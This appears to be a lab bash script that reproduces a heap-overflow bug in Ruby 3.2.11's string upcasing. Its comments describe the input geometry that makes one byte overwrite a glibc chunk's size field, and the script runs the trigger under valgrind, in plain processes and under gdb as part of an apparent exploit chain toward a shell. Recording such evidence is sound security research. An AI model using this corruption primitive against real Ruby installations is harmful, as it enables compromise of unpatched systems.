#!/usr/bin/env bash
# W353: replay the mixed-parity geometry on EOL Ruby 3.2.11 (plain build).
# One leading 'a' then N x 0xDF (N = 27/43/59, N == 11 mod 16) makes
# capa = N+21 even and the overflow offset R = N+45 == 8 (mod 16), i.e.
# the single fixed 0x53 byte lands on the next glibc chunk's size LSB.
# Runs valgrind (write stack), fresh unsanitized processes (glibc metadata
# diagnostics), an even-N safe control, and one gdb before/after byte read.
# Raw evidence is gitignored under lab/build/evidence/casemap-chain/w353/.
set -u
cd "$(dirname "$0")/../.." || exit 1
EVID=lab/build/evidence/casemap-chain/w353
RB=lab/build/plain/ruby-3.2.11-plain/bin/ruby
GDB=lab/repro/ruby2shell-mixed-eol.gdb
MIXED=lab/repro/ruby2shell-rung3-mixed.rb

[ -x "$RB" ] || { echo "missing $RB" >&2; exit 2; }
[ -f "$GDB" ] || { echo "missing $GDB" >&2; exit 2; }
mkdir -p "$EVID/plain"

for n in 27 43 59; do
  for i in 1 2 3; do
    valgrind --error-limit=no "$RB" "$MIXED" "$n" >"$EVID/mixed-$n-$i.txt" 2>&1
    rc=$?
    writes=$(grep -c 'Invalid write of size 1' "$EVID/mixed-$n-$i.txt" || true)
    block=$(grep -m1 -o '0 bytes after a block of size [0-9]*' "$EVID/mixed-$n-$i.txt" || true)
    written=$(grep -m1 '^N=.* mixed upcase ok' "$EVID/mixed-$n-$i.txt" || true)
    printf 'vg N=%s i=%s rc=%s writes=%s %s %s\n' "$n" "$i" "$rc" "$writes" "$block" "$written"
  done
done

for n in 27 43 59 28; do
  for i in 1 2 3; do
    "$RB" "$MIXED" "$n" >"$EVID/plain/mixed-$n-$i.txt" 2>&1
    rc=$?
    diag=$(grep -m1 -E 'munmap_chunk|corrupted size|invalid next size' "$EVID/plain/mixed-$n-$i.txt" || true)
    printf 'plain N=%s i=%s rc=%s %s\n' "$n" "$i" "$rc" "$diag"
  done
done

gdb -q -batch -x "$GDB" --args "$RB" "$MIXED" 27 >"$EVID/gdb-mixed27.log" 2>&1
printf 'gdb-mixed27 rc=%s\n' "$?"
grep -E 'BEFORE|AFTER' "$EVID/gdb-mixed27.log"
